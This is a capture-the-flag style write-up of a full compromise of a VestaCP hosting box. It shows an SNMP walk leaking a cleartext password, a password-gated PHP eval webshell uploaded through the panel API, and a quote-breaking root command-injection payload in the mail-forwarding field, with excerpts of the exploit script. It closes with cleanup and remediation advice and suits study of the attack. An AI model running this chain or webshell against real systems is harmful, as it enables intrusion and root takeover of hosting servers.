01

Reconnaissance

Sixteen TCP ports, and the UDP one that mattered

The target is a hosting server. Sixteen TCP ports, a full mail stack, a control panel, and — as it turned out — one UDP port that decided the whole box.

1.1 Full TCP scan

Never trust a top-1000 sweep on a hosting box; the interesting panel is usually in the 8000s.

command
nmap -p- -sV --min-rate 3000 -oN nmap_full.txt 192.168.161.156

Sixteen ports, and every one of them is a real service:

output
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
25/tcp   open  smtp     Exim smtpd 4.90_1
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18
80/tcp   open  http     nginx
110/tcp  open  pop3     Dovecot pop3d
143/tcp  open  imap     Dovecot imapd
465/tcp  open  smtps    Exim smtpd 4.90_1
587/tcp  open  submission  Exim smtpd 4.90_1
993/tcp  open  imaps    Dovecot imapd
995/tcp  open  pop3s    Dovecot pop3d
2525/tcp open  smtp     Exim smtpd 4.90_1
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
8083/tcp open  http     nginx
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)

Reading it:

  • 80 and 8083 are nginx; 8080 and 8443 are Apache. Two web servers on one host, with nginx in front. That is a reverse-proxy layout, not a single site.
  • mod_fcgid means PHP-FPM-style execution under Apache. On a hosting panel that usually means PHP runs as the vhost owner, not www-data — a PHP file you control is a real user shell.
  • Four SMTP listeners (25, 465, 587, 2525) and a complete Dovecot stack. This is a mail server.
  • 3306 reachable from the network is notable on its own. Panel installers bind MySQL to 127.0.0.1; a remote handshake means somebody changed bind-address.
  • No 88, 389, 636, 445. Standalone host, not a domain member. AD tooling is wasted here.

1.2 The TLS certificate names the product

Every mail port and FTP present the same certificate. That is free fingerprinting — read it before you fuzz anything.

command
nmap -p21,25,110,143,465,587,993,995 --script ssl-cert 192.168.161.156
output
Subject: commonName=oscp.example.com
         organizationName=Vesta Control Panel
         stateOrProvinceName=California
         countryName=US
Not valid before: 2022-11-08T08:16:51
Not valid after:  2023-11-08T08:16:51

Reading it:

  • O=Vesta Control Panel is the answer to "what is on 8083" before you ever open it.
  • A 2022-11-08 build date sets the patch baseline. Ubuntu 18.04 with a late-2022 image means most 2018–2019 CVEs are patched; anything from 2021 onward may still be live.
  • CN=oscp.example.com is the vhost the panel was installed for. Remember it — the panel's upload handler compares HTTP_ORIGIN against exactly this name and dies on a mismatch.
  • The certificate expired in 2023. Nobody renewed it, which is a small signal that the box is unmaintained.

1.3 The scan that was missing

The whole TCP surface is a distraction. The entry point was on UDP/161, and no TCP scan can see it.

command
sudo nmap -sU -p 53,69,123,137,161,500,623 --script snmp-info,snmp-sysdescr 192.168.161.156
output
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   snmpEngineBoots: 15
|_  snmpEngineTime: 55m02s
53/udp  open  domain  ISC BIND 9.11.3-1ubuntu1.18

Reading it:

  • SNMPv1 server ... (public) — the NSE script has already told us the community string is public and that v1 is accepted. That is unauthenticated read access to the entire MIB tree.
  • snmpEngineBoots: 15 means the daemon has been up a while and is not being restarted defensively.
  • v1 matters: SNMPv1 has no per-user authentication, so a community string is the only control.

-p- on TCP is not a port scan. It is a TCP port scan. The distinction cost more time on this box than any other single mistake.

1.4 What the shape of the box implies

Before touching an exploit, the layout constrains the answer:

Observation Implication
Vesta panel on 8083, Apache back-end on 8080/8443 Hosting control plane — it runs privileged shell commands for users
mod_fcgid PHP runs as vhost owner, so webshell = user shell
Full Exim + Dovecot + Roundcube stack Mailboxes will hold credentials and mail
MySQL on the network Either an exposed database or a deliberately weakened one
O=Vesta Control Panel, expired cert Unmaintained install, panel-era vulnerabilities plausible
161/udp public Free unauthenticated read of the host's MIB tree

The intended path on a panel box is almost never "exploit the web server". It is get any account, then abuse the panel's own privilege. Chapter 03 is where the account comes from.

02

Web enumeration

Two servers, one panel, one false positive

Four HTTP services. Three of them turned out to be the same application seen through different listeners, and one "endpoint" turned out to be a file that was already there.

2.1 nginx on 80 — the placeholder site

command
curl -s http://192.168.161.156/ | head -40
curl -s http://192.168.161.156/robots.txt
output
## robots.txt (65 bytes)
User-agent: *
Disallow: /phpmyadmin/
Disallow: /webmail/

The site itself is a 1055-byte "Coming Soon" page — a stock Vesta placeholder. robots.txt is more useful than the page: it names the two applications a hosting box always ships.

command
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
  http://192.168.161.156/phpmyadmin/ \
  http://192.168.161.156/webmail/ \
  http://192.168.161.156/roundcube/

Both /phpmyadmin/ and /webmail/ are served, and /webmail/ is Roundcube. On a mail host that is a mailbox-login surface, and mailboxes are where onboarding credentials live.

2.2 Apache on 8080 and 8443 — the back-end

The Apache listeners sit behind nginx and serve the same vhosts. Two things are worth checking:

command
curl -s -o /dev/null -w 'server-status: %{http_code}\n' http://192.168.161.156/server-status
curl -s -o /dev/null -w '8443 root:     %{http_code} %{size_download}\n' -k https://192.168.161.156:8443/
output
server-status: 502
8443 root:     200 1055

502 means nginx proxies /server-status to Apache and Apache refuses — the status handler is not enabled. 8443 returns the same 1055-byte placeholder, confirming the Apache listeners are the same vhosts, not a separate application. There is no second web app here.

2.3 The panel on 8083

command
curl -sk https://192.168.161.156:8083/ | grep -iE 'title|static/js'
output
<title>Vesta</title>
<script src="/static/js/2.5dc90ea3.chunk.js"></script>
<script src="/static/js/main.57f35a42.chunk.js"></script>

<div id="root"> and a webpack bundle named webpackJsonpreact-control-panel mean this is the React single-page frontend, which Vesta shipped in 0.9.8-27 (Nov 2021). The old PHP/XHTML login page is gone.

That single fact rewrites the exploit table:

CVE Affects Status on a 0.9.8-27 build
CVE-2019-9859 ≤ 0.9.8-23 dead — panel is newer
CVE-2020-10786 ≤ 0.9.8-26 dead
CVE-2020-10807 / CVE-2020-10808 ≤ 0.9.8-26 dead
CVE-2020-10966 ≤ 0.9.8-25 dead
CVE-2021-28379 ≤ 0.9.8-27 live, but needs an authenticated admin session
API-key LPE (#2045) any build with v-generate-api-key live, post-foothold

The React frontend does not mean the PHP API was hardened. web/api/ and web/upload/UploadHandler.php are still underneath. But every remaining panel bug is authenticated — so the panel stops being the front door and becomes a credential-reuse target.

2.4 The false positive worth remembering

Probing for the upload handler produced this:

command
for p in /upload/index.php /upload/ /api/index.php /api/ /manifest.json /; do
  printf '%-22s ' "$p"
  curl -sk -m 10 -o /dev/null \
    -w 'http=%{http_code} size=%{size_download}\n' "https://192.168.161.156:8083$p"
done
output
/upload/index.php      http=200 size=2586
/upload/               http=200 size=2586
/api/index.php         http=200 size=0
/api/                  http=200 size=0
/manifest.json         http=404 size=1254
/                      http=200 size=2586

/upload/index.php looks like a live endpoint. It is not. It returns exactly the same 2586 bytes as / because it is the same file: a 66-byte stub.

command
curl -s https://raw.githubusercontent.com/outroll/vesta/master/web/upload/index.php
output
<?php include($_SERVER['DOCUMENT_ROOT'].'/static/index.html'); ?>

That is the entire file. It includes the SPA shell and returns 2586 bytes — identical to /, because it is /. Identical response sizes across "different" endpoints mean one file, not two. The real handler is web/upload/UploadHandler.php (54,838 bytes), and it is gated:

output
include($_SERVER['DOCUMENT_ROOT']."/inc/main.php");   // -> session_start()
if ((!isset($_SESSION['user'])) && (!defined('NO_AUTH_REQUIRED'))) {
    header("Location: /login/"); exit;
}

So unauthenticated upload is out. The /api/ paths return 200 with a zero-byte body — the directory exists, the index is empty. Not an endpoint either.

2.5 Read the JS bundle instead of fuzzing

The React app has to name every API route it calls. That is cheaper than a wordlist.

command
curl -sk https://192.168.161.156:8083/static/js/main.57f35a42.chunk.js -o main.js
grep -oE '(api|upload)/[a-zA-Z0-9_./?=-]*' main.js | sort -u | head -40
grep -oE 'v-[a-z0-9-]+' main.js | sort -u | head -40

The v-* hits matter: every panel action is a wrapper around a script in /usr/local/vesta/bin/, invoked as /usr/bin/sudo /usr/local/vesta/bin/<script>. That design is the entire privilege story of the box — chapter 06.

2.6 Where this leaves us

The web surface is fully mapped and fully useless without a credential:

  • No unauthenticated upload path.
  • No reachable server-status.
  • phpMyAdmin and Roundcube both present, both want a login.
  • All remaining panel CVEs require a session.

The box is a credential problem, not an exploit problem. Chapter 03 gets the credential from a protocol that has no authentication at all.

03

SNMP

The host publishes its own password

161/udp answered to public. That gives unauthenticated read access to the MIB tree. On a Linux host with net-snmp, one subtree in that tree stores the command lines the daemon is configured to run — arguments included.

3.1 Where to look: the extend subtree

NET-SNMP's extend directive lets an administrator expose arbitrary command output as an OID. The daemon keeps three views of it:

OID Table Holds
1.3.6.1.4.1.8072.1.3.2.2 nsExtendConfigTable command + arguments the daemon will execute
1.3.6.1.4.1.8072.1.3.2.3 nsExtendOutputFullTable stdout of the last run
1.3.6.1.4.1.8072.1.3.2.4 nsExtendConfigPersistTable persisted config

nsExtendOutputFull is the one everybody remembers, because it is human-readable. On this box the config table was the one that mattered — it holds the argument list, and the argument list contained a password.

3.2 Walk it

command
snmpwalk -v1 -c public 192.168.161.156 1.3.6.1.4.1.8072.1.3.2
output
iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 2

## nsExtendConfigTable — what the daemon runs
iso.3.6.1.4.1.8072.1.3.2.2.1.2.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "/bin/sh"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "-c \"echo \\\"jack:3PUKsX98BMupBiCf\\\" | chpasswd\""

iso.3.6.1.4.1.8072.1.3.2.2.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "/bin/echo"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "\"\\\"jack:3PUKsX98BMupBiCf\\\" | chpasswd\""

## nsExtendOutputFullTable — what it printed
iso.3.6.1.4.1.8072.1.3.2.3.1.1.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "Changing password for jack."
iso.3.6.1.4.1.8072.1.3.2.3.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"

## nsExtendConfigPersistTable — the cleanest copy
iso.3.6.1.4.1.8072.1.3.2.4.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100.1 = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"

3.3 Reading the OIDs

The ugly numeric indices are not random. An extend entry's OID is <column>.<len>.<ascii byte>... — the length of the entry name, then its characters as decimal ASCII.

output
14 . 114.101.115.101.116.45.112.97.115.115.119.111.114.100
│     r   e   s   e   t   -   p   a   s   s   w   o   r   d
└ 14 characters

So .14.… is the extend named reset-password, and .18.… is reset-password-cmd:

output
18 . 114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100
     r   e   s   e   t   -   p   a   s   s   w   o   r   d   -   c   m   d

That is not just cosmetic — it tells you the two entries are a pair, and that the admin's intent was "reset the password, and here is the command that does it". Which is exactly what the string says:

output
"/bin/sh"  -c  "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"

Decoded: run /bin/sh -c, echo jack:3PUKsX98BMupBiCf into chpasswd. chpasswd reads user:password pairs from stdin and applies them.

The credential is jack : 3PUKsX98BMupBiCf. Not a guess, not a crack — published by the host, in cleartext, to anyone who sends a UDP packet.

3.4 The output table confirms it

nsExtendOutputFull for the entry returns:

output
"Changing password for jack."

chpasswd prints Changing password for <user>. on success and nothing on failure. So this is not merely a configured command — it had been executed successfully, and the daemon kept the output for us. Two independent OIDs, same secret.

3.5 Why this happens

/etc/snmp/snmpd.conf usually gets an entry like:

output
extend reset-password /bin/sh -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"

It is a legitimate provisioning or monitoring hook: some dashboard pings the OID to force a known password, and reads the result back. The mistake is structural rather than accidental —

  1. the community string is the default public, so the table is world-readable;
  2. the secret is passed as a command-line argument, and command lines are stored in the MIB;
  3. SNMPv1 has no per-user authentication, so there is no second gate.

Two mitigations, either of which breaks the chain: a non-default community with an ACL, or passing the password by stdin/file instead of argv. The install had neither.

3.6 Verify the credential before you build on it

Vesta panel users are system users, so one credential can work in several places. Check the cheap ones first — a 200 here replaces an entire exploit chain.

command
## SSH: is jack a login account?
ssh jack@192.168.161.156

## panel API: fetch a CSRF token, then authenticate
TOK=$(curl -sk https://192.168.161.156:8083/api/v1/login/session.php | grep -oE '"token":"[a-f0-9]+"' | cut -d'"' -f4)
curl -sk -o /dev/null -w 'login: %{http_code}\n' \
  -d "user=jack&password=3PUKsX98BMupBiCf&token=$TOK" \
  https://192.168.161.156:8083/api/v1/login/index.php

## mail: Dovecot / Roundcube use the same system account
curl -s --url 'imap://192.168.161.156/' -u 'jack:3PUKsX98BMupBiCf' -v 2>&1 | grep -iE 'OK|NO|Login'

The panel API does not use HTTP basic auth — it is session-based with a CSRF token, which is why the token fetch comes first.

On this box the panel was the way in — chapter 04. Note what is not true: this is a regular panel user, not an administrator. The escalation in chapter 06 is reached from that unprivileged account, which is why the box is worth writing up.

04

Panel access

A session, and what a session is worth

jack is a regular panel user. Not an admin. Everything in chapters 05 and 06 happens from that unprivileged account, which is the point of the box.

4.1 The login is not a form

The React frontend talks to a PHP API under /api/v1/. Two requests are needed: one to obtain a CSRF token, one to authenticate with it.

command
## 1. token
curl -sk https://192.168.161.156:8083/api/v1/login/session.php
output
{"token":"a1b2c3d4e5f6..."}
command
## 2. authenticate (form-encoded, not JSON, and not HTTP basic auth)
TOK=$(curl -sk https://192.168.161.156:8083/api/v1/login/session.php | grep -oE '"token":"[a-f0-9]+"' | cut -d'"' -f4)
curl -sk -c cookies.txt -o /dev/null -w '%{http_code}\n' \
  -d "user=jack&password=3PUKsX98BMupBiCf&token=$TOK" \
  https://192.168.161.156:8083/api/v1/login/index.php

The exploit script reports the outcome explicitly:

output
[INFO] Attempting login to https://192.168.161.156:8083 as jack
[+] Logged in as jack

Reading it:

  • The token is issued before authentication. It is a CSRF control, not a credential — anyone can get one.
  • The session lands in a PHPSESSID cookie. Every later call needs -b cookies.txt.
  • The status code is not a reliable signal here. Check that a PHPSESSID was set and that a follow-up authenticated call returns data instead of a redirect to /login/.

inc/main.php is the gate every authenticated page includes:

output
session_start();
if ((!isset($_SESSION['user'])) && (!defined('NO_AUTH_REQUIRED'))) {
    header("Location: /login/"); exit;
}

It also pins the session to the client IP:

output
if($_SESSION['user_combined_ip'] != $user_combined_ip && $_SERVER['REMOTE_ADDR'] != '127.0.0.1'){
    session_destroy(); header("Location: /login/"); exit;
}

So the cookie only works from the IP that created it — and 127.0.0.1 is exempt. Remember that exemption if you ever get local access; it is how the panel's own cron/CLI calls authenticate.

4.2 What jack can reach

The API is a flat set of verbs, each mapping to one panel script:

output
/api/v1/list/web/index.php      /api/v1/add/web/index.php
/api/v1/list/mail/index.php     /api/v1/add/mail/index.php
/api/v1/edit/mail/index.php     /api/v1/delete/mail/index.php
/api/v1/upload/?dir=<path>
/api/v1/login/session.php       /api/v1/logout/index.php

Two of these are the whole exploit: add/web + upload give file write into a served docroot, and edit/mail reaches a privileged shell. Chapter 05.

Note what is not here: nothing in the list is an admin-only verb. jack is allowed to create web domains, create mail domains, add mailboxes, and upload files — because that is what a hosting customer does. The bug is not the authorisation check. The bug is what the panel does with the values a customer supplies.

4.3 The design that makes it exploitable

Every panel action is a thin PHP wrapper over a shell script in /usr/local/vesta/bin/:

output
define('VESTA_CMD', '/usr/bin/sudo /usr/local/vesta/bin/');

That single line explains the entire privilege model: the panel runs /usr/local/vesta/bin/v-* as root on behalf of a normal user. Argument construction is string concatenation. Any field that reaches a v-* script is a root-context substring, and quoting is the only thing standing between a customer and root.

So the question on a Vesta box is never "is there an injection". It is "which field reaches a v-* script, and is it quoted?"

4.4 What we did not get

Worth recording, because it constrains the write-up:

  • No admin panel account. The escalation does not need one.
  • No MySQL credential. 3306 completed a handshake but no login was obtained — and none was needed for this path.
  • No SSH shell as jack was required. The panel route reached the same account with fewer steps.

The next chapter turns the session into code execution as jack, and then into root.

05

Foothold

File write into a docroot, execution as the vhost user

The panel lets a customer create a web domain and upload files into it. That is the product working as intended. It also means the customer controls PHP source that Apache will execute.

5.1 Create a web domain

A panel user can only create domains under their own account, which is fine — we own jack.

command
TOK=$(curl -sk https://192.168.161.156:8083/api/v1/login/session.php | grep -oE '"token":"[a-f0-9]+"' | cut -d'"' -f4)

curl -sk -b cookies.txt -c cookies.txt \
  -d "ok=add" -d "token=$TOK" \
  -d "v_domain=4wfarbc2dg.poc" \
  -d "v_ip=<panel-ip>" \
  -d "v_aliases=www.4wfarbc2dg.poc" \
  -d "v_dns=on" -d "v_mail=on" -d "v_proxy=on" \
  https://192.168.161.156:8083/api/v1/add/web/index.php

The script does this defensively: it lists existing web domains first, and reuses one if the random .poc name already exists.

output
r = us.get(targetHost + '/api/v1/list/web/index.php', verify=False)
...
r2 = us.post(targetHost + '/api/v1/add/web/index.php', verify=False, data={
    "ok": "add", "token": getSession(us, targetHost, 2)['token'],
    "v_domain": shellHost, "v_ip": selectedIP, "v_aliases": "www." + shellHost,
    "v_dns": "on", "v_mail": "on", "v_proxy": "on", "v_proxy_ext": webConf['proxy_ext']})

Creating the domain builds the directory tree:

output
/home/jack/web/4wfarbc2dg.poc/public_html/

5.2 Upload a webshell into it

/api/v1/upload/ takes a dir query parameter and a multipart file — the same handler that refuses unauthenticated callers. Authenticated, it is a general file-write primitive.

output
r = us.post(targetHost + '/api/v1/upload/?dir=/home/' + username + '/web/' + shellHost + '/public_html',
            verify=False,
            files={'files': ('ownwebshell.php',
                             '<?php\nif(@$_GET["password"]!="e43c9f07ed59712efa492aa0ae259cd0") exit();\n'
                             'eval($_GET["e"]);')})

The shell itself:

output
<?php
if (@$_GET["password"] != "e43c9f07ed59712efa492aa0ae259cd0") exit();
eval($_GET["e"]);

A shared secret gates it — so an opportunistic scanner that finds ownwebshell.php gets nothing. That is worth copying in your own PoCs: an unauthenticated eval() on a test box is how writeups get turned into someone else's access.

Reading the primitive:

  • The upload path is absolute, supplied by the client. Nothing restricts it to the user's own home. That is the CVE-2021-28379 shape, authenticated.
  • public_html is served by Apache with mod_fcgid, so PHP executes as jack — the vhost owner — not as www-data.
  • The file lands owned by the vhost user with the right permissions, because the panel creates it.

Call it with the vhost's Host header:

command
curl -s "http://192.168.161.156/ownwebshell.php?password=e43c9f07ed59712efa492aa0ae259cd0&e=id" \
  -H 'Host: 4wfarbc2dg.poc'

The response body is whatever the command printed. Because Apache runs the file through mod_fcgid, that is the vhost owner — jack — not www-data. The Host header is required: without it nginx serves the 1055-byte placeholder vhost and the file is never reached.

The script departs from a manual test here and goes straight on to the injection, so the webshell was verified in practice by the root shell it later carried commands for — not by a separate id call.

5.3 This is a foothold, not root

jack is a normal system user with no administrative rights in the panel. A webshell as jack is a foothold, not a win. It is useful for two things only: proving execution, and giving us file handles we control for the next step.

That second point is the whole reason it exists in this chain. Chapter 06 needs a directory the attacker can write a command into and read a result out of — public_html is exactly that, and the webshell provides both halves:

output
/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdtoexec    <- we write the command here
/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdresult    <- root writes the output here

5.4 Where the real bug is

Reading the mail-edit handler shows the shape of the problem. The panel takes the forwarding address and hands it to the mail script:

output
r = us.post(targetHost + '/api/v1/edit/mail/index.php?domain=' + shellHost + '&account=' + Vaccount,
            verify=False, data={
                "save": "save", "token": getSession(us, targetHost, 2)['token'],
                "v_domain": shellHost, "v_password": '', "v_quota": "unlimited",
                "v_aliases": '', "v_fwd": payload, "v_credentials": '',
                "Username": "@" + shellHost, "v_account": Vaccount, "Password": ''})

v_fwd is an email forwarding address — user-controlled free text. It is interpolated into the command line of v-edit-mail-account, which the panel invokes through /usr/bin/sudo. The next chapter closes the loop.

5.5 The full script

The whole chain — domain creation, upload, mailbox creation, injection — is in scripts/vesta-rce-exploit.py. It is a standalone single file and needs only requests.

command
python3 -m venv .venv && . .venv/bin/activate
pip install requests
python3 scripts/vesta-rce-exploit.py https://192.168.161.156:8083 jack '3PUKsX98BMupBiCf'

Its main() is the chain in twelve lines:

output
ip         = getIPfromHostname(target_host)
pwn_domain = f"{get_random_string().lower()}.poc"
session    = requests.Session()

login(session, target_host, username, password)
getWebshell(session, target_host, pwn_domain, username, ip)
mailbox = createMailBox(session, target_host, pwn_domain, True)
editMailBox(..., 'testPayload')                      # verify the field is injectable

backdoor_payload = (
    f"';bash</home/{username}/web/{pwn_domain}/public_html/iamroot/cmdtoexec>"
    f"/home/{username}/web/{pwn_domain}/public_html/iamroot/cmdresult;A='"
)
editMailBox(..., backdoor_payload)                   # root context fires here

while True:
    cmd = input("# ").strip()
    deploycommand(cmd, ip, pwn_domain)               # webshell writes cmdtoexec
    editMailBox(..., "foobar")                       # re-trigger the injection
    print(queryWebshell('echo `cat ./iamroot/cmdresult;`;', ip, pwn_domain))

Two design notes:

  • editMailBox(..., 'testPayload') first is a capability check. If the edit fails, the whole chain stops before creating a backdoor — better than leaving half an exploit on the box.
  • Each command costs three HTTP requests. It is not a socket; it is a stateless request loop, which is why it feels slow.
06

Privilege escalation

A forwarding address that runs as root

The foothold in chapter 05 executes as jack. This chapter does not need a kernel bug, a setuid binary, or a cron job. It abuses the panel's own privilege: a normal user's input reaches a script the panel runs through sudo.

6.1 The privileged call

Every mail action is a wrapper around /usr/local/vesta/bin/v-edit-mail-account:

output
define('VESTA_CMD', '/usr/bin/sudo /usr/local/vesta/bin/');

The panel builds a shell command string from the request. v_fwd — the forwarding address — is interpolated into it. v-edit-mail-account then writes the forwarding into the Dovecot/Exim config, and it is executed with root rights because the panel's sudoers rule allows it.

That is the whole boundary. A customer-supplied string becomes part of a root shell command line. Quoting is the only control, and quoting is defeated by a single '.

6.2 Why one injection is not enough

Naively you would send ; id and read the output. Two problems:

  1. The output does not come back to you. The panel captures the script's stdout into its own HTTP response — which you receive, but only as the panel's formatting, and only for the first command in the string. Anything appended after it is invisible.
  2. The command must not break the panel's own command line. If the trailing quote is left unbalanced, the shell errors out and the panel returns a failure — and you learn nothing.

So the payload has to survive being embedded, and it has to give us our own input/output channel. Which is what the webshell from chapter 05 is for.

6.3 Payload anatomy

output
';bash</home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdtoexec>/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdresult;A='

Four parts:

Fragment Job
'; close the panel's quoted argument and start a new command
bash<…cmdtoexec>…cmdresult run whatever is in cmdtoexec, write stdout to cmdresult
; end that command
A=' reopen a quote so the panel's remaining command line stays balanced

It contains no spaces. That matters: the value travels as a form field through several layers, and a space-free payload survives quoting, IFS splitting and any naive word-splitting on the way. < and > do the argument separation that spaces would normally do.

The result is a file-based command channel:

output
webshell writes  →  public_html/iamroot/cmdtoexec
injection runs   →  bash cmdtoexec > cmdresult        (as root)
webshell reads   →  public_html/iamroot/cmdresult

public_html is writable by jack and readable through Apache, so both ends are ours. The execution is root's.

6.4 Second-order injection

This is not reflected injection. The dangerous value is stored first — as a mailbox forwarding address, in the mail configuration — and evaluated later, by a different process, with different privileges:

output
1. POST /api/v1/edit/mail/index.php     →  v_fwd stored     (request as jack)
2. v-edit-mail-account runs under sudo  →  value evaluated  (process as root)

Two consequences follow, and both are useful beyond this box:

  • Input filtering at the API layer is the wrong place to look. The value is legal free text for a forwarding address. It is only dangerous where it is used.
  • The trigger is repeatable. Re-saving the mailbox re-runs the script, which is exactly how the script's command loop works: write cmdtoexec, re-save the mailbox with v_fwd=foobar to re-trigger, read cmdresult.

That pwd is the most interesting line in the whole box. The working directory of the root shell is /usr/local/vesta/web/api/v1/edit/mail — the cwd of the PHP request handler that invoked v-edit-mail-account. The root command inherited it.

Forensically that is a fingerprint: a root process whose cwd is a web request directory means panel-level command injection, not a binary exploit. On the defensive side, that is where you look first.

6.7 What actually gave root

Worth being precise, because "Vesta is vulnerable" is not an explanation:

  • sudoers permits the panel account to run /usr/local/vesta/bin/v-* as root, without argument restrictions. Any argument the panel passes is therefore root-controlled data.
  • v-edit-mail-account builds a shell command line by string concatenation and does not quote v_fwd as a single token.
  • The API treats v_fwd as unvalidated free text, because a forwarding address legitimately is.

Remove any one of those three and the chain breaks.

6.8 Routes present but not used

Recorded as hypotheses, not results — none of these were exercised on this box:

Route Why it is plausible Status
Exim ${run{}} from a local shell 4.90_1 predates the June-2019 fix unless the Ubuntu revision is -1ubuntu1.2; local exploitation needs no local_part_suffix untested — dpkg -l exim4-daemon-light after a shell decides it
Vesta API-key LPE (#2045) Any non-empty key in /usr/local/vesta/data/keys/ allows escalation via v-generate-api-key untested — ls -la /usr/local/vesta/data/keys/
CVE-2019-0211 (Apache 2.4.29) Local privesc, reachable from a shared-memory write in an Apache worker untested — needs execution inside a worker

The remote Exim path was ruled out earlier: the server answered 550 Restricted characters in address for a payload containing /, which is Debian's stock ACL, and stock Debian ships without local_part_suffix. With no address extensions, ${run{}} cannot be reached over SMTP. That is a config conclusion, not a patch-state conclusion — which is why the dpkg check is still listed above.

6.9 Why we did not need any of them

The panel route was fast and deterministic once the credential existed: one script, one injection, root. Every extra branch is time you spend while the box is already owned.

The lesson generalises. On a hosting panel, enumerate the v-* surface before you look for binary exploits — the panel's own privilege model is the vulnerability.

Proof, debris, remediation, lessons

Two flags, one root shell, and a non-trivial amount of debris to remove.

local.txt sitting in jack's home is consistent with the intended path: the box expects you to land as jack first. The SNMP leak is the intended front door, and it hands you exactly that account.

7.2 What the exploit left behind

The script creates real state on the target. If this were a client engagement rather than a lab, each of these would need to be documented and removed:

Artifact Location
web domain 4wfarbc2dg.poc — /home/jack/web/4wfarbc2dg.poc/
webshell /home/jack/web/4wfarbc2dg.poc/public_html/ownwebshell.php
command channel /home/jack/web/4wfarbc2dg.poc/public_html/iamroot/

DNS records vhost + mail records created by v-add-web-domain / v-add-mail-domain

The mailbox forwarding entry is the one people forget. It is stored — it persists after you drop the shell, and it re-executes the payload every time the mailbox is saved.

7.3 Cleanup

Remove the domain through the panel (the panel cleans up its own nginx/Apache/DNS state, which is safer than rm -rf):

command
TOK=$(curl -sk https://192.168.161.156:8083/api/v1/login/session.php | grep -oE '"token":"[a-f0-9]+"' | cut -d'"' -f4)

## 1. delete the mail domain (removes the account and its forwarding)
curl -sk -b cookies.txt \
  "https://192.168.161.156:8083/api/v1/delete/mail/index.php?domain=4wfarbc2dg.poc&token=$TOK"

## 2. delete the web domain (removes public_html, the webshell and iamroot/)
curl -sk -b cookies.txt \
  "https://192.168.161.156:8083/api/v1/delete/web/index.php?domain=4wfarbc2dg.poc&token=$TOK"

Then verify — from the shell, not from the panel's response:

command
ls -la /home/jack/web/           # 4wfarbc2dg.poc must be gone
ls -la /etc/exim4/domains/       # no 4wfarbc2dg.poc
grep -r 4wfarbc2dg /etc/nginx/conf.d/ /etc/apache2/sites-enabled/ 2>/dev/null

If the forwarding entry survives in /etc/exim4/domains/*/aliases, the injection is still live even after the domain is deleted. Check it explicitly.

7.4 Defensive remediation

In priority order:

  1. Do not interpolate user input into v-* shell calls. Pass arguments as an array, quote with "$@", and stop the blanket sudo rule that lets a panel user run every v-* script as root.
  2. Fix SNMP. Non-default community, ACL to management hosts, or disable the daemon. Then audit nsExtendConfigTable for every secret that has ever appeared in an extend argument — those secrets are compromised, not merely exposed.
  3. Rotate jack. A credential published over SNMP for months is burned.
  4. Constrain the upload API. Absolute dir parameters should not be client-controlled; enforce an allow-list and keep writable paths outside any docroot.
  5. Bind MySQL to 127.0.0.1 and restrict 8083 to VPN or source-IP allow-lists.
  6. Migrate off VestaCP. Upstream stalled for years and this class of injection is endemic to its design. HestiaCP is the maintained fork.

7.5 Lessons

Run a UDP scan first. This box was decided by nmap -sU -p 161. The full TCP sweep, the four SMTP listeners, the panel version — all of it was noise until a UDP packet returned a password.

Version banners are hints, not gates. Time went into Exim 4.90_1 / CVE-2019-10149 on the strength of a banner string that cannot distinguish a patched Ubuntu build from a vulnerable one. The config answered faster than the version did: 550 Restricted characters in address is Debian's stock ACL, and stock Debian has no local_part_suffix, so the remote path was never reachable.

Stop when a service says no twice. SMTP gave a syntax error, then an ACL denial. That was the answer. Everything after was sunk cost.

Identical response sizes mean one file. / and /upload/index.php both returned 2586 bytes because upload/index.php is a 66-byte stub that includes the SPA shell. Two "endpoints" with the same length are one endpoint.

On a panel box, read the v-* surface. The question is not whether an injection exists, but which field reaches a v-* script. v_fwd is an email forwarding address — free text by design, evaluated as root by design.

Second-order beats first-order. The value was legal where it was stored and only dangerous where it was used. Input validation at the API was never going to catch it.

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

